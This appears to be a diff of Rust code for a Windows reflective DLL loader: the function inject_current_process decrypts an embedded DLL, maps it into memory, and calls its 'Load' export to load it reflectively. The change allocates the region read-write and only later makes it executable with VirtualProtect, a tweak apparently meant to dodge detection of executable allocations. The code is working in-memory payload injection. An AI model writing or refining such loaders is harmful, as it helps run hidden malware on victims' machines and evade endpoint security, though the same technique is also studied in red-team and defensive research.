@@ -8,7 +8,7 @@ use windows_sys::Win32::System::{
     Diagnostics::Debug::{IMAGE_DIRECTORY_ENTRY_EXPORT, IMAGE_NT_HEADERS64, IMAGE_SECTION_HEADER},
     Memory::{
         MEM_COMMIT, MEM_RELEASE, MEM_RESERVE, PAGE_EXECUTE_READWRITE, PAGE_READWRITE, VirtualAlloc,
-        VirtualFree,
+        VirtualFree, VirtualProtect,
     },
     SystemServices::{IMAGE_DOS_HEADER, IMAGE_EXPORT_DIRECTORY},
 };
@@ -57,7 +57,7 @@ pub fn inject_current_process() {
             null_mut(),
             nt.OptionalHeader.SizeOfImage as usize,
             MEM_COMMIT | MEM_RESERVE,
-            PAGE_EXECUTE_READWRITE,
+            PAGE_READWRITE,
         );
 
         let nt_ptr = p_decrypt.add(dos.e_lfanew as usize) as *const u8;
@@ -66,12 +66,19 @@ pub fn inject_current_process() {
         let mapped_nt_ptr = (p_alloc as usize + dos.e_lfanew as usize) as *mut IMAGE_NT_HEADERS64;
 
         // Free the decryption scratchpad
-        VirtualFree(p_decrypt, DLL_BYTES.len(), MEM_RELEASE);
+        VirtualFree(p_decrypt, 0, MEM_RELEASE);
 
         //
         // Find the 'Load' export and call the reflective loader (which exists in `Load``)
         //
         if let Some(load_fn) = find_export_address(p_alloc, mapped_nt_ptr, "Load") {
+            let mut old_protect = 0;
+            let _ = VirtualProtect(
+                p_alloc,
+                nt.OptionalHeader.SizeOfImage as usize,
+                PAGE_EXECUTE_READWRITE,
+                &mut old_protect,
+            );
             let reflective_load: unsafe extern "system" fn(*mut c_void) -> u32 = transmute(load_fn);
 
             // Call the export and hope for the best! :D
